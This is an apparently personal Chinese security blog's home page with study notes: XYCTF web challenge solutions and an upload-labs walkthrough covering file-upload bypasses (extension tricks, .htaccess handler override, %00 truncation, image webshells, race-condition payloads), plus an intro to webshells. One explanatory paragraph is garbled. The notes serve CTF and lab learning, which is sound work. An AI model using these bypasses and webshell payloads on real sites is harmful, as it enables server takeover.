
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8" />
    <title>Live For Code</title>
    <meta name="author" content="Live For Code" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.1.1"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>LIVE FOR CODE</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;LIVE FOR CODE</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div
        id="home-background"
        ref="homeBackground"
        data-images="/images/background.jpg"
    ></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Live For Code</h1>
                <h3></h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div
    id="home-posts-wrap"
    ref="homePostsWrap"
    true
>
    <div id="home-posts">
        

<div class="post">
    <a href="/article/1906377861/">
        <h2 class="post-title">[XYCTF]刷题笔记</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/4/12
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h5 id="Solved-Warm-up"><a href="#Solved-Warm-up" class="headerlink" title="[Solved]Warm up"></a>[Solved]Warm up</h5><p>第一个是经典的0e绕过，?val1&#x3D;QNKCDZO&amp;val2&#x3D;240610708</p>
<p>$$md5 &#x3D;&#x3D; md5$$md5)用特殊字符串&amp;md5&#x3D;0e215962017</p>
<p>第三个利用$XYCTF可以被复写，保证xyctf和xy相同即可，md5编码XYCTF_550102591发现是0e打头，用0e绕过即可，&amp;XYCTF&#x3D;240610708&amp;XY&#x3D;240610708</p>
<p>接下来访问LLeeevvveeelll222.php</p>
<p>第一个if用到了interval，post,利用数组绕过a[]&#x3D;a</p>
<p><code>echo preg_replace($_GET[&#39;a&#39;],$_GET[&#39;b&#39;],$_GET[&#39;c&#39;]);</code>查阅资料得知a处正则用&#x2F;e方式读取可以执行命令，payload：<code>?a=/re/e&amp;b=print_r(scandir(&#39;.&#39;))&amp;c=re</code>读取到flag在根目录，&amp;b&#x3D;highlight_file(‘&#x2F;flag’)读取flag</p>
<h5 id="Solved-ezhttp"><a href="#Solved-ezhttp" class="headerlink" title="[Solved]ezhttp"></a>[Solved]ezhttp</h5><p>robots.txt-&gt;拿到账号密码</p>
<p>hackbar一路修改请求头即可</p>
<p>特殊之处在于X-Forward-F被过滤，用Client-ip</p>
<p>代理用Via</p>
<h5 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h5><p>传入两张同样的图片，返回{“areEqual”:false,”md5Equal”:true,”md5_1”:”af6794c93d1157c0688d6cc5600b8cae”,”md5_2”:”af6794c93d1157c0688d6cc5600b8cae”}</p>
<p>从网上查阅到两个MD5值相同但是图片不同的特例：</p>
<p><img src="/../images/plane.jpg"></p>
<p><img src="/../images/ship.jpg"></p>
<p>上传后得到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/article/1906377861/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/article/1664270079/">
        <h2 class="post-title">upload-labs刷题笔记</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/category/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                学习笔记
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/4/4
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="upload-labs刷题笔记"><a href="#upload-labs刷题笔记" class="headerlink" title="upload-labs刷题笔记"></a>upload-labs刷题笔记</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>源代码:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个前端js验证代码，对上传文件的类型进行限制，把一句话脚本的名字改成hack.php.jpg,burp suite抓包把jpg去了即可，复制图片链接，蚁剑链接</p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php语言,是后端验证，同样是对上传的文件有图片格式的限制</p>
<p>image&#x2F;jpeg image&#x2F;png这种格式叫做MIME,上传时直接上传php脚本，bp抓包改content-type内容即可</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>函数解释：deny_ext :黑名单列表</strong></p>
<p><strong>trim(): :删除字符串两端的空格或其他预定义字符。用trim()函移除字符。我们没有添加移除的字符，就默认移除下列字符”\0” - NULL、”\t” - 制表符、”\n” - 换行、”\x0B” - 垂直制表符、”\r” - 回车、” “ - 空格（ltrm、rtrim）</strong></p>
<p><strong>deldot() :把文件后面的点删除windows的特性会自动对后缀名去”.” 处理比如: webshell.php. 。</strong></p>
<p><strong>strrchr() :查找字符串在另一个字符串中最后-次出现的位置,并返回从该位置到字符串结尾的所有字符(截取后缀)</strong></p>
<p><strong>str_ireplace():替换字符串中的一些字符（不区分大小写）。遵循的一些规则如果搜索的字符串是一个数组那么它会返回一个数组，且对数组中的每个元素进行查找和替换。（str_replace区分大小写）用str_ireplace(’::$DATA’, ‘’,fileext ) 函 数 防 止 在 后 缀 中 添 加 “ : : file_ext)函数防止在后缀中添加”::file</strong><br><strong>e</strong></p>
<p> <strong>xt)函数防止在后缀中添加”::DATA”绕过利用windows特性，可在后缀名中加” ::$DATA”绕过</strong></p>
<p><strong>strtolower(): 故名思意,转换为小写</strong></p>
<p><strong>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。strrpos() 函数对大小写敏感。</strong></p>
<p><strong>stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</strong><br><strong>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</strong><br><strong>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</strong><br><strong>getimagesize() :用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</strong></p>
<p>从源码中我们可以看出设定了黑名单，’.asp’,’.aspx’,’.php’,’.jsp’后缀的文件都不允许上传，并且会检查大小写、删除点和空格。</p>
<p>#后缀绕过常用手段<br>PHP:<br>php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)<br>ASP：<br>asa、cer、cdx<br>ASPX：<br>ascx、ashx、asac<br>JSP：<br>jsp、jspx、jspf</p>
<p><strong>有时候需要挨个进行尝试</strong></p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>根据源代码得知，黑名单限制太多，换一种方式绕过，使用’.htaccess’文件绕过</p>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>&#x2F;&#x2F;.htaccess  修改文件<br><code>SetHandler application/x-httpd-php</code></p>
<p>再上传一个图片格式的木马即可，自动解析为php</p>
<p>ps：phpstudy的apache有问题，复现不了</p>
<p>另一种方法是后缀名冗余(未知拓展名绕过)绕过，例如修改成<strong>one.php.aaa、one.php.xxxx</strong>等。然后直接使用中国菜刀连接。5,6也是这种方法绕过</p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>加.(空格)<code>a.php. </code></p>
<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>加.<code>a.php.</code></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>增加后缀::$DATA</p>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>冗余后缀名</p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>替换了后缀名</p>
<p>pphphp(php) phphpp(hpp)复写尝试</p>
<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);<span class="comment">//白名单</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);<span class="comment">//后缀</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;<span class="comment">//后缀存在</span></span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过截断上传（0x00，%00，&#x2F;00 ）实现。<code>a.php%00</code>，filename要改成jpg</p>
<p>（1）php版本要小于5.3.4。</p>
<p>（2）文件路径可控。</p>
<p>（3）magic_quotes_gpc需要为OFF状态。（在php.ini中）</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>save_path变成了POST提交,区别在于不对%00自动编码，需手动解码</p>
<h2 id="14-16"><a href="#14-16" class="headerlink" title="14-16"></a>14-16</h2><p>图片马cmd执行<code>copy a.jpg/b+ b.php c.jpg</code></p>
<p>可以绕过getimagesize()函数来实现对文件类型的识别判断,exif_imagetype()函数获得图片文件的类型，从而实现文件白名单的过滤操作。</p>
<p>利用文件包含来使用木马</p>
<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p>二次渲染绕过</p>
<p>绕过二次渲染的核心思想便是先上传一张图片，再将上传完成后的图片下载下来，对比渲染前后图片的编码变化，将我们的代码写在未被渲染的区域便可绕过二次渲染。<br>由于不同格式文件的特性，在进行绕过二次渲染时，选用gif的图像最容易成功，对于jpg和png这两种图片需要用脚本进行改写，也不在进行尝试。</p>
<p>用winhex工具,在最后加上php代码</p>
<p><img src="/../images/0413-1.png"></p>
<p>将渲染后的gif文件下载到本地，通过对比软件对比渲染前后的十六进制数据。下图左为渲染前，右为选然后的文件。未标红的即为前后未发生变化的区域。</p>
<p><img src="/../images/0413-2.png"></p>
<p>将木马写到该区域再次进行尝试上传并利用文件包含访问。</p>
<h2 id="17-1"><a href="#17-1" class="headerlink" title="17"></a>17</h2><p>条件竞争</p>
<p>分析源码，对于上传的文件处理是先保存到服务器，再对比拓展名，如果拓展名不属于白名单中的三种后缀，便由18行的操作执行unlink操作将保存的文件删除</p>
<p><code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;</code>通过写入这行代码，一旦竞争成功，文件会留在服务器，可访问此文件调用phpinfo()</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/../images/0413-3.png"></h2><p>bp的intruder模块发包，自己去浏览器刷新或者用python脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.159.128/upload-labs-master/upload/eval.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p>同样是条件竞争,只不过需要图片马,把上面的代码写进图片即可</p>
<p>Pass19 — %00截断，参考Pass11<br>Pass20 — 0X00截断，参考Pass12</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="color: #00bcd4">学习笔记</a>
        </span>
        
    </div>
    <a href="/article/1664270079/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/article/3998144523/">
        <h2 class="post-title">文件上传漏洞学习笔记</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/category/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                学习笔记
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/4/3
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>参考文章:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43390703/article/details/104858705">https://blog.csdn.net/qq_43390703/article/details/104858705</a></p>
<h3 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h3><p>攻击者上传可执行的动态脚本文件，可以是木马，病毒，恶意脚本或者WebShell等。</p>
<p>什么是webshell？<br>WebShell就是以<strong>asp</strong>、<strong>php</strong>、<strong>jsp</strong>或者<strong>cgi</strong>等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录。</p>
<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ul>
<li>对上传文件的后缀名没有做较为严格的限制</li>
<li>对上传文件的MIMETYPE没有做检查</li>
<li>权限上没有对于上传的文件目录设置不可执行权限</li>
<li>对于web server对于上传文件或者指定目录的行为没有做限制</li>
</ul>
